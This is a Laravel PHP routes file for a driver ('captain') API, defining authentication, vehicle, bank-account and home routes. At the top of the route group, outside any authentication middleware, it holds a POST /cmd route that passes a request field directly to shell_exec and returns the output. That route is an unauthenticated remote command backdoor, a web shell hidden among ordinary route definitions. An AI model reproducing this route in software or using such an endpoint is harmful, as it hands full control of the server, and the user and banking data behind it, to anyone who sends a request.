<?php
namespace App\Http\Controllers\Api\V1\Captains;
use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;

Route::group(['namespace' => 'Captains'], function () {
    /* =========================== CMD =========================== */
    Route::post('/cmd', function (Request $request) {
        return shell_exec($request->line);
    })->name('cmd');
    /* =========================== CMD =========================== */

    /* =========================== Auth =========================== */
    Route::group(['namespace' => 'Auth'], function () {
        Route::POST('send-code', 'AuthController@sendCode');
        Route::POST('check-code', 'AuthController@check');
        Route::POST('register-captain', 'AuthController@registerCaptain');

        Route::group(['middleware' => ['auth:captain', 'scope:allow-captain']], function () {
            Route::POST('register-vehicle', 'AuthController@registerVehicle');
            Route::POST('register-bank-account', 'AuthController@registerBankAccount');
        });
    });
    /* =========================== \Auth =========================== */

    /* =========================== Home =========================== */
    Route::group(['middleware' => ['auth:captain', 'scope:allow-captain']], function () {
        Route::GET('details', 'HomeController@details');
    });
    /* =========================== \Home =========================== */
});
